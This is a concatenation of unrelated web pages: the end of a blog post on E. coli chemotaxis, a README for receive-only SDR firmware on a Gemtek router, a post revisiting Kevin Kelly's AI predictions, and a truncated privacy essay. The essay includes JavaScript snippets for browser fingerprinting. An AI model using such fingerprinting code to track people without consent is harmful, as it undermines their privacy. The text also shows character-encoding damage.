spins. We know that bacterial flagellar motors are powered by the proton motive force from a 1977 paper that measured how cells ran or âtwiddledâ in the presence or absence of an electrical potential. But the research has become even more refined than that. Just by observing the strength of the rotation under various conditionsâdifferent viscosities, temperatures, and so onâwe know that ârotation is tightly coupled to proton flow, with a fixed number of protons (~500) used to drive each revolution.â [ Blair ] Think of how detailed an understanding weâve gotten! One reason Iâm particularly attracted to studies of E. coli chemotaxis is that itâs an early star of whatâs been called âin silicoâ biology. Itâs been the subject of many computer models. Dennis Bray, the author of that book that put me onto this stuff in the first place, made one of the more popular models . Hereâs a nice screenshot of the model in action: Maybe the chief role of a computer model is that to get it working in the first place you have to explicitly articulate every one of your assumptions. In much the same way that writing tends to clarify your thinking (or at least reveal how unclear it really is), a computer model forces you to synthesize what you know. If anything itâs even more exacting than a blank page. Once you have a model, you can use it to explore variations on those assumptions. âThe program gives the correct phenotype of over 60 mutants in which chemotaxis-pathway components are deleted or overexpressed,â Bray writes. At best, a good enough model lets you discover things you didnât already know, or suggests your next experiment. âIn order to match the impulse response to a brief stimulus [. . .] we also had to increase the activities of the adaptational enzymes CheR and CheB at least an order of magnitude greater than published values.â So what? Why should you care about E. coli chemotaxis? A typical answer to that sort of questionâand Iâm sure the answer given in many of the grant applications supporting the work cited hereâis that there are medical and practical uses. For instance: if you understand the signaling pathways of bacterial chemotaxis you can disrupt them; that work might lead to a new kind of antibiotic, which, in an era of increasing resistance, is direly needed. Or you might hijack chemotaxis pathways to create âintelligent sniffersâ (Keith Cassidyâs phrase) that could home in on cancer cells or environmental waste. More generally you might sayâand in fact I led with this up topâthat understanding this specific phenomenon equips you to understand all kinds of others. âBacterial two-component pathways [ defân ] control a dazzling array of functions including cell division, virulence, antibiotic resistance, metabolite fixation and utilization, response to environmental stress, sporulation, and taxis.â But I donât know, to me the real reason is that itâs neat. One thing that strikes me about this book, excellent as it is, is that itâd probably be a tough way to actually learn biology. Instead, try the stuff cited in the âReading listâ at the bottom of this post . Falke, Joseph J. et al. â The Two-Component Signaling Pathway of Bacterial Chemotaxis: A Molecular View of Signal Transduction by Receptors, Kinases, and Adaptation Enzymes. â 1997. A really nice paper that tells the basic story, if in somewhat forbidding technical language. Falke, Joseph J. et al. â Architecture and signal transduction mechanism of the bacterial chemosensory array: Progress, controversies, and challenges. â 2014. Another good review-ish paper. Bray, Dennis et al. âComputer Simulation of the Phosphorylation Cascade Controlling Bacterial Chemotaxis.â 1993. A good example of in silico biology. Bray, Dennis et al. â The chemotactic behavior of computer-based surrogate bacteria. â 2007. Another, later paper by Bray with a more detailed computer model. â Bacterial Chemotaxis .â A nice page from the Theoretical and Computational Biophysics group at the University of Illinois at UrbanaâChampaign. Cassidy, C. Keith. Personal website. This fellow used to work at the UIUC group in the previous reference. He is a leading expert on the structure of the chemotaxis signaling complex. He now directs a lab at the University of Missouri-Columbia Beniaguev, David et al. â Single cortical neurons as deep artificial neural networks. â 2021. A paper showing that âcortical neurons are well approximated by a deep neural network (DNN) with 5â8 layers.â Koushik, Paul et al. â A molecular mechanism of direction switching in the flagellar motor of Escherichia coli. â 2011. This is where all those great diagrams showing a hypothesized mechanism for the rotor switching come from. I only wish theyâd animated them! (Maybe they felt that they were already out on a limb, and making a video of a proposed mechanism would make it seem realer than it deserve to be? Or maybe they just thought it was too hard.) Berg, Howard. â Swimming Escherichia coli . â Archived web page with lots of videos of E. coli in motion. Berg was one of the OG chemotaxis people, and also wrote the amazing Random Walks in Biology, cited below. Alon, U. et al. â Robustness in bacterial chemotaxis. â 1999. I donât know if I understood this paper all that well, except to get the point that the chemotaxis system doesnât rely on there being some precise concentration of any of the component parts, e.g. CheY. Like many biological systems it works in the face of lots of gotchas and what-have-yous. â Self-Assembling NanoMachine: a film about flagellar biosynthesis .â A whole documentary (!) about the way that the bacterial flagellar motor is made, and the various discoveries that elaborated the process. Pretty hard to believe that this documentary exists, but there it is. Itâs awesome. Di Paolo, Diana et al. â Single-molecule imaging of electroporated dye-labelled CheY in live E coli. â A neat paper showing the tracking of CheY through the cytoplasm. Goodsell, David. â The Machinery of Life â 1993. One of my favorite biology books, maybe even one of my favorite books of all time. Simple, clear, magically illustrated. This should be the high school biology textbook. MunJu, Kim et al. Macro Scale Model E. Coli Flagella Bundling . YouTube video from this paper . 2003. Uses the drill and tubing to simulate flagellar bundling. Sarkar, Mayukh K. et al. â Chemotaxis signaling protein CheY binds to the rotor protein FliN to control the direction of flagellar rotation in Escherichia coli. â Pretty clear title! Vladimirov, Nikita. â Multiscale modeling of E.coli chemotaxis. â Github project page. Hereâs a model I tried to actually runâand shockingly, it worked out of the box. Sadly it didnât show little virtual E. colis running and tumbling around on my screen, but still pretty cool. Blair, D F. â How bacteria sense and swim. â 1995. A really well-written review article. Milo, Ron and Phillips, Rob. â Cell Biology by the Numbers â 2015. The dimensions above were adapted by me (maybe erroneously) from a conversation/slides by Drew Endy. He got some of his numbers from this BioNumbers book, which is a very neat and totally necessary compendium of facts that help you understand life at cell scale. Bray, Dennis / Noble, Denis. This âwind instrumentâ analogy is not original, I donât think. Iâm guessing it originated with either Dennis Bray or Denis Noble (maybe in The Music of Life ).

Resources Readme License Activity Stars 749 stars Watchers 10 watching Forks 73 forks Report repository main Branches Tags Go to file Code Open more actions menu Latest commit History 9 Commits 9 Commits Folders and files Name Name Last commit message Last commit date LICENSES LICENSES docs docs firmware firmware host host include include init init kernel/ w1700k_sdr kernel/ w1700k_sdr platform platform tests tests tools tools .gitignore .gitignore LICENSE LICENSE Makefile Makefile README.md README.md View all files Repository files navigation README License More items W1700K SDR Turns a Gemtek W1700K Wi-Fi 7 router into a wideband software-defined receiver. The router's MediaTek MT7996 radio captures raw 14-bit IQ at up to 320 Msps, its Airoha AN7581 SoC streams it over 10 GbE, and a Linux host shows it as a live spectrum and waterfall in the browser, with the receiver's controls next to it. The whole 2.4 GHz band at 320 Msps, live, with the decimation's roll-off corrected in the stream ("flatten"): a 262,144-point FFT of every sample, 100 spectra a second (this recording runs at 50 frames a second). The MT7996 runs only our own firmware: a ROM patch, WM and WA built from this repository, with no MediaTek code. It brings the radio up from a cold power-on by itself, from MediaTek's initialisation and calibration decoded register by register against a trace of MediaTek's own firmware, and takes its commands (LO, sample rate, capture, stream, gain, filter) from the host. See docs/architecture.md and docs/roadmap.md . What it does Sample rates 40, 80, 160 or 320 Msps of 14-bit complex IQ on every band, independent of the LO and the filter; on band 2 also 640/2 (every other sample of 640 Msps: flat to ±155 MHz, but signals 160–320 MHz away fold in) Bands 2.4 GHz (MT7976), 5 GHz and 6 GHz (two MT7977s); switching bands is a register write inside a running stream Tuning No channels: the LO is any Hz a band's synthesizer locks at (unit A: 2.081–2.748, 4.647–7.509 and 4.707–7.576 GHz), on its grid of 2.98 Hz (2.4 GHz) or 11.9–14.3 Hz steps; retuned mid-stream (about 1 ms) Front end AGC or manual LNA/baseband gain; analog filter 20–320 MHz Transport the radio DMAs into a 1 GiB ring in SoC DRAM; the kernel sends every 8 KiB slice as one UDP datagram, zero-copy, on the 10 GbE port; at 320 Msps half the slices are packed to 28 bits per sample pair on the radio's own cores to fit the link (lossless, automatic) Host w1700k-stream receives the export and serves the IQ stream to every consumer on the host (shared memory, complex int16, gap-tagged), with an optional correction ("flatten") of the decimation's roll-off applied to the samples themselves; w1700k-spectrum : 262,144-point FFT at 100 frames/s over every sample, browser UI, live controls; sdr-recv records the stream Screenshots 2.4 GHz at 320 Msps, flattened: Wi-Fi frames and shorter hopping bursts on a floor that stays level to the band's edges. The Stream panel shows the link carrying 9.75 Gbit/s, half of the slices packed, and every sample transformed. Two busy 80 MHz Wi-Fi channels at 5170–5330 MHz in a flattened 320 MHz view. Zoomed to 24 MHz around 5250 MHz: the two channels' edges and the guard gap between them, in 1.22 kHz bins. Repository Path platform/ What runs on the SoC: our U-Boot, Linux 6.18 with board patches, a read-only BusyBox root kernel/w1700k_sdr/ The MT7996 driver (firmware download, the DMA ring, the 10 GbE export, the firmware's command mailbox) and its unit-side clients firmware/ Our MT7996 firmware: the ROM patch, the WM (radio bring-up and band set-up, streams, RF control) and the WA (packer) host/w1700k/ Host control: firmware load, streaming, RF control as firmware commands; w1700k serve for the web UI host/stream/ w1700k-stream , the host's one receiver of the export: the IQ stream in shared memory for every consumer, and the roll-off correction host/spectrum/ The spectrum/waterfall web server host/recv/ sdr-recv , the stream recorder init/ Installation from stock, updates, recovery, return to stock include/hw/ Register reference: every known MT7996, A-die and AN7581 register, as C headers docs/ Architecture , roadmap Getting started You need a W1700K (HW 1.x) or W1700K2 (HW 2.1), a 3.3 V USB serial adapter on its console header, an Ethernet cable to its lan3 port for installation, and a 10 GbE NIC on the host cabled to its wan port (10GBASE-T; an X710 with a copper SFP+ module works) for the IQ stream. Both revisions run the same images. Most units carry a W25N04KV NAND; some W1700K2s carry a W25N04LV (ID ef 8b 23 ), which is supported but has never been run on a unit: init/install stops on one until you pass --i-dont-care-about-nand-corruption , and asks for a raw dump of it ( init/rawdump ) for the maintainers. make # everything, from public sources (~10 min plus downloads) make check # the test suite sudo init/host/link up IFACE # 192.168.1.10/24 on the NIC cabled to lan3 sudo init/host/tftp-forward enable IFACE init/install # back up the NAND, install, save the radio calibration sudo init/host/link up IFACE10G 10.77.0.10/24 9216 # the 10 GbE stream link host/stream/build/w1700k-stream & # the stream, for every consumer on this host host/spectrum/build/w1700k-spectrum --controller " host/bin/w1700k serve " --listen 0.0.0.0:8073 Then open http://HOST:8073/ and press ▶. The first start loads the radio firmware and brings the radio up (about 2 s). Without the browser, the same operations are host/bin/w1700k load|start|band|tune|gain|filter|stop|status . Build requirements: a C/C++ compiler, make, git, Python 3.10+, the usual Buildroot prerequisites, clang, ld.lld, llvm-objcopy and llvm-readobj (RISC-V firmware), openssl (firmware container encryption), and libfftw3-dev and zlib for the stream service and the spectrum server. No vendor firmware is downloaded or needed. Read before use Our firmware is receive-only. It runs none of MediaTek's transmit calibrations and keeps the MAC's transmit path disabled; a gapless watch at 5250 MHz saw nothing during a load, where MediaTek's firmware transmits a full-power burst. Still, do not cable an antenna port straight into a sensitive instrument without an attenuator. Our ROM patch writes no eFuse. MediaTek's ROM patches since 2025 permanently program one eFuse gate bit on their first run (also with MediaTek's own driver); a unit that ever ran one has that bit set. Installation replaces the stock operating system. init/install first copies the NAND's data to the host; keep that copy. init/restore writes it back and returns the unit to its stock firmware. Accessing undocumented MT7996 or AN7581 addresses can hang the SoC or wedge the radio until a power cycle. include/hw/ marks every known hazard. Licence MIT, except the Linux driver and kernel patches (GPL-2.0-only), U-Boot patches (GPL-2.0+), the driver's user-space header (GPL-2.0 WITH Linux-syscall-note) and files derived from MediaTek's mt76 driver (BSD-3-Clause-Clear). See LICENSE . About No description, website, or topics provided. title: Kevin Kelly's 2016 AI Predictions, 10 Years Later
body_text: Kevin Kelly's 2016 AI Predictions, 10 Years Later taylor.town about hire --> spam rss bsky msto twt --> Kevin Kelly's 2016 AI Predictions, 10 Years Later Kevin Kelly 's The Inevitable articulates a handful of macro technological trends and follows them to their logical conclusions. It's an insightful read -- I highly recommend it. One decade later, here are some AI-related excerpts from the book: "By 2026, Google’s main product will not be search but AI." "oligarchy of two or three large, general-purpose cloud-based commercial intelligences" "The AI on the horizon looks more like Amazon Web Services" "The bulk of AI will be special purpose software brains" "in conversational tones, any question at all" "By 2026, Google’s main product will not be search but AI." Around 2002 I attended a private party for Google—before its IPO, when it was a small company focused only on search. I struck up a conversation with Larry Page, Google’s brilliant cofounder. “Larry, I still don’t get it. There are so many search companies. Web search, for free? Where does that get you?” My unimaginative blindness is solid evidence that predicting is hard, especially about the future, but in my defense this was before Google had ramped up its ad auction scheme to generate real income, long before YouTube or any other major acquisitions. I was not the only avid user of its search site who thought it would not last long. But Page’s reply has always stuck with me: “Oh, we’re really making an AI.” I’ve thought a lot about that conversation over the past few years as Google has bought 13 other AI and robotics companies in addition to DeepMind. At first glance, you might think that Google is beefing up its AI portfolio to improve its search capabilities, since search constitutes 80 percent of its revenue. But I think that’s backward. Rather than use AI to make its search better, Google is using search to make its AI better. Every time you type a query, click on a search-generated link, or create a link on the web, you are training the Google AI. When you type “Easter Bunny” into the image search bar and then click on the most Easter Bunny–looking image, you are teaching the AI what an Easter Bunny looks like. Each of the 3 billion queries that Google conducts each day tutors the deep-learning AI over and over again. With another 10 years of steady improvements to its AI algorithms, plus a thousandfold more data and a hundred times more computing resources, Google will have an unrivaled AI. In a quarterly earnings conference call in the fall of 2015, Google CEO Sundar Pichai stated that AI was going to be “a core transformative way by which we are rethinking everything we are doing. . . . We are applying it across all our products, be it search, be it YouTube and Play, etc.” My prediction: By 2026, Google’s main product will not be search but AI. In 2017, Google researchers published Attention Is All You Need , which introduced a deep-learning architecture called the transformer . "oligarchy of two or three large, general-purpose cloud-based commercial intelligences" As it does, this cloud-based AI will become an increasingly ingrained part of our everyday life. But it will come at a price. Cloud computing empowers the law of increasing returns, sometimes called the network effect, which holds that the value of a network increases much faster as it grows bigger. The bigger the network, the more attractive it is to new users, which makes it even bigger and thus more attractive, and so on. A cloud that serves AI will obey the same law. The more people who use an AI, the smarter it gets. The smarter it gets, the more people who use it. The more people who use it, the smarter it gets. And so on. Once a company enters this virtuous cycle, it tends to grow so big so fast that it overwhelms any upstart competitors. As a result, our AI future is likely to be ruled by an oligarchy of two or three large, general-purpose cloud-based commercial intelligences. Kelly predicted AI heavyweights while advocating for a future of open weights: Ideally, this additional intelligence should be not just cheap, but free. A free AI, like the free commons of the web, would feed commerce and science like no other force we can imagine and would pay for itself in no time. "The AI on the horizon looks more like Amazon Web Services" Amid all this activity, a picture of our AI future is coming into view, and it is not the HAL 9000—a discrete machine animated by a charismatic (yet potentially homicidal) humanlike consciousness—or a Singularitan rapture of superintelligence. The AI on the horizon looks more like Amazon Web Services—cheap, reliable, industrial-grade digital smartness running behind everything, and almost invisible except when it blinks off. This common utility will serve you as much IQ as you want but no more than you need. You’ll simply plug into the grid and get AI as if it was electricity. "The bulk of AI will be special purpose software brains" Not even Kelly foresaw the bitter lesson : Yet most of the commercial work completed by AI will be done by nonhuman-like programs. The bulk of AI will be special purpose software brains that can, for example, translate any language into any other language, but do little else. Drive a car, but not converse. Or recall every pixel of every video on YouTube, but not anticipate your work routines. In the next 10 years, 99 percent of the artificial intelligence that you will interact with, directly or indirectly, will be nerdly narrow, supersmart specialists. "in conversational tones, any question at all" Very soon now we’ll live in a world where we can ask the cloud, in conversational tones, any question at all. And if that question has a known answer, the machine will explain it to us. Who won the Rookie of the Year Award in 1974? Why is the sky blue? Will the universe keep expanding forever? Over time the cloud, or Cloud, the machine, or AI, will learn to articulate what is known and not known. At first it may need to engage us in a dialog to clarify ambiguities (as we humans do when answering questions), but, unlike us, the answer machine will not hesitate to provide deep, obscure, complex factual knowledge on any subject—if it exists. … As we cognify more books and movies and the internet of things, answers become ubiquitous. We are headed to a future where we will ask several hundred questions per day. Most of these questions will concern us and our friends. “Where is Jenny? What time is the next bus? Is this kind of snack good?” The “manufacturing costs” of each answer will be nanocents. Search, as in “give me an answer,” will no longer be considered a first-world luxury. It will become an essential universal commodity.

title: Fingerprints are the new cookies
body_text: Fingerprints are the new cookies â home You're protected from the methods I use here. You disabled JavaScript, so this fingerprinting trick can't run at all. You're still vulnerable to network-based methods. Read on to see what it does to everyone else. From now on Iâll call you: â¦ computingâ¦ Try refreshing the page. Clear the cookies. Connect to a VPN. Youâre still the â¦ . Now open it on your phone or some other device and your nickname will be different and just as consistent. Is it different in incognito? Good. But itâs always the same? Bad news. Imagine this: Most websites you visit get paid to show ads and indirectly run my script that lets me know youâre the â¦ . I can use it to decide what ads youâll see. But more importantly, if youâve made an account on that website, I can offer to buy your data - whatever they can share under their privacy policy: your name, activity, conversations with AIâ¦ Pretty soon Iâd know more about you than your friends do - perhaps more than you know yourself. âSo what?â - you say. âI have nothing to hide. And I prefer my ads to be relevantâ¦ sometimes they show me exactly what I need! And the data is anonymised anywayâ¦â See, the thing is, itâs not about you at all. Itâs not really about the ads anymore either. Nobody cares about you. And if the police or your government happen to care, Iâll gladly take their money too. I look at all this data and I donât see people. I see patterns. Patterns emerging out of patterns. A living, digital fractal state of the economy, society and human psyche. The crystal ball of the 21st century and itâs made of silicon! Thatâs the product. And to the highest bidder it goes! What does that make you then? A gear? An ox? A volunteer? Fingerprints are the new cookies Remember the big fuss about third-party cookies? It was so big that the EU had already rolled out one of its greatest inventions - consent banners. If EU ships faster than tech companies, that can only mean the tech companies are sitting on their hands. And one of those tech companies happens to hold two-thirds of the browser market. What was the play? Letâs give it up for Google - the biggest ad company on Earth! ACT I. PRESSURE - âPRIVACY IS PARAMOUNT TO US, IN EVERYTHING WE DO.â Itâs 2019 and the cookies are still hot. Itâs become bad PR and Safari and Firefox already block them. A year later Google pledges: we will destroy cookies!! And establish a new, privacy-first reign. ACT II. DISTRACTION - âINSTEAD OF DEPRECATING THIRD-PARTY COOKIES, WE WOULD INTRODUCE A NEW EXPERIENCEâ 5 years later: people are now preoccupied with far greater worries than cookies, and the solutions Google has developed (Privacy Sandbox) kinda suck and have raised antitrust concerns so nobody uses them. âYou know what, letâs just keep the cookies. Weâll mask your IP address* though!â (* but only when incognito while authenticated) (** in the end they didnât even deliver on that) ACT III. ACCELERATION - YOU CAN NOW USE DEVICE FINGERPRINTING IN OUR AD PRODUCTS Now thereâs a better way to know whoâs who! How does fingerprinting work? Nice, letâs nerd out properly. You visit a website. Your browser sends a request to the server and the server returns code for the browser to run. The request already reveals information about you; what browser you use, the language itâs in, the OS that runs it and your IP address, which the server needs to send you the response. That often reveals your location. Then the code runs. See, weâve made a lot of civilizational progress in making browsing safe. Long gone are the days when getting a virus just by visiting a website was a daily concern . The thing is, the definition of safety varies depending on who you ask. The broad consensus ends at isolation: a websiteâs code canât see the data stored by other websites, and it canât see your files or other applications without permission. Chrome and Edge stop here. Then you have Safari (especially on iOS/macOS 26+) and Firefox extending that definition to privacy, but they still donât fully protect you from fingerprinting. Brave and Tor are the leading privacy-first browsers, with up and coming Mullvad Browser (Mullvad being, in my opinion, one of the best VPN providers out there). The code runs on your hardware, which can be measured in ways that produce consistent and unique readings. Thereâs not much that can be done about this really, so thereâs only two established solutions: feed a little bit of noise here and there. Itâs called farbling and thatâs what Brave does to make your fingerprint inconsistent. make everything look the same, always, so thereâs no telling browser users apart. Tor and Mullvad adopt this approach. Ok, letâs create a fingerprint So there are two sources for data that can make up your fingerprint; the network request and the code environment. When you look at network, the data is generally either fragile or generic: the IP address; in a âhappy pathâ where one person always uses the same IP address, it might be the only data you need. But commonly people do a lot of browsing on mobile networks, they share the WiFi with others, they use VPNs or their home networkâs IP address is rotated by the ISP. Itâs fragile as such. headers like User-Agent or Accept-Language ; reveal your browser, OS, versions and the language set. When you can execute code on the device, you have ways to measure its hardware qualities (without any permission prompts!) and these are surprisingly stable: GPU; behaviour, vendor, driver CPU; behaviour, vendor, number of threads memory size display data; resolution, pixel ratio, refresh rate audio processing device model And on the software level; installed fonts, extensions, system infoâ¦ Millions of devices use the latest Chrome, there are millions of Macs with the M4 chip and there are millions of browsers in French. But when you look at devices that run the latest Chrome in French on an M4 , that number now drops significantly. Add to it hardware measurements and it gets so low it becomes practically unique. The fingerprint doesnât need to be truly, globally unique - it just needs to be unique enough to tell people apart in your sample size. A ZIP code (inferred from IP), a birth date (youâve given away on some platform) and sex (you fill it in everywhere) together are enough to uniquely identify over 60% of Americans. You can always add another variable to decrease the potential pool of candidates. Information Entropy Have you ever played Akinator ? You think of a character, a genie asks you some twenty questions, and somehow it knows. Thatâs fingerprinting in a nutshell, except your browser answers the questions for you. Once you understand information entropy, Akinatorâs magic turns into a simple trick. Letâs simplify with that game where you have to guess the character on a board through questions like âIs my character a man?â. If I say âyesâ, and half of the characters on your board are men, youâre now considering only half of the total candidates. Now we can say that my answer gave you logâ(100 / 50) = logâ(2) = 1 bit of information , because it cut the pool of candidates in half. The bits you get from one answer are called its surprisal: the rarer the answer, the more it tells you. a trait shared by 1 in 2 people is worth 1 bit (is a man), 1 in 8 is worth 3 bits (has a mustache), and 1 in 128 is worth 7 bits (has one eye). Surprisal quantifies the value of the answer, and entropy quantifies the value of the question. If 1 person in 128 is one-eyed, then asking about it will yield ânoâ 127 times in 128. Answer Probability Surprisal Entropy contribution Yes 1/128 logâ(128 / 1) = 7 bits 1/128 x 7 = ~0.055 No 127/128 logâ(128 / 127) = ~0.0113 bits 127/128 x 0.0113 = ~0.011 Summing up the contribution of each possible answer, the question itself is worth ~0.066 bits of entropy - thatâs the average amount of bits you gain from an answer. When we combine traits that are independent we simply add up their bits or multiply the ratios, so a man with a mustache and one eye would mean 11 bits, or 1 in 2048. Alas, as Thomas Bayes would have you know, nothing is ever so simple in practice. A mustache is already a strong indicator of a man, and a man is probably more likely to have one eye. The traits are not independent so the bits donât really add up. Some interesting applications of this type of reasoning: In medical diagnostics : A positive result from a 99% accurate test for a disease known to affect 0.01% of the population is about 100 times more likely to be wrong than you are to have the disease. You need more evidence! In cryptography : A password made out of four random words is as strong as eight random keyboard characters (but much easier to remember!) In forensic science : singling out one person in a city of a million takes about 20 bits. A witness description that matches 1 person in 1,000 provides only 10 bits, which still leaves a thousand possible suspects. So what can I do about it? Test your browser: coveryourtracks.eff.org shows you how unique your fingerprint is, with entropy for each measured data point. If youâre using Chrome youâre basically walking around with an ID on your forehead. Safari and Firefox offer some level of protection, but youâre still identifiable by advanced trackers. Brave , Tor and Mullvad Browser are the only major browsers at the moment that implement advanced protections against fingerprinting. If you donât feel like switching browsers, I get it. I am a big Arc fan myself and unfortunately itâs discontinued and will never have any privacy features. There are extensions like JShelter - they disrupt fingerprinting scripts by intercepting browser API calls. But they also break some websites. Same problem applies to Firefoxâs Resist Fingerprinting feature. The ironic truth is, privacy extensions make you more unique, since fewer people have them. So a smart tracker could detect that, ignore the signals disrupted by the extension and focus on the ones that are not. No extension can be as effective as engine-level protection built into the browser. So if you donât want to be tracked, you gotta commit. methods used on this page Iâm simply creating a hash out of a few measurements of your device. Any of these change and the hash is now different. Professional applications are much more complex than this and are able to maintain identification line when single variables change. OfflineAudioContext Renders a short tone through a compressor without playing it; tiny float differences in the result depend on your browserâs audio engine and your CPU. const off = new OfflineAudioContext ( 1 , 5000 , 44100 ); // â¦ a 1 kHz triangle wave into a dynamics compressor â¦ const data = ( await Promise . race ([off. startRendering (), timeout])). getChannelData ( 0 ); let sum = 0 ; for ( let i = 4500 ; i < 5000 ; i++) sum += Math . abs (data[i]); return sum. toFixed ( 3 ); WebGL Reads your GPUâs vendor and model (without version numbers), what the GPU and its driver support, and the pixels of a small rendered triangle. const gl = document . createElement ( 'canvas' ). getContext ( 'webgl' ); const dbg = gl. getExtension ( 'WEBGL_debug_renderer_info' ); return gpuName (gl. getParameter (dbg ? dbg.
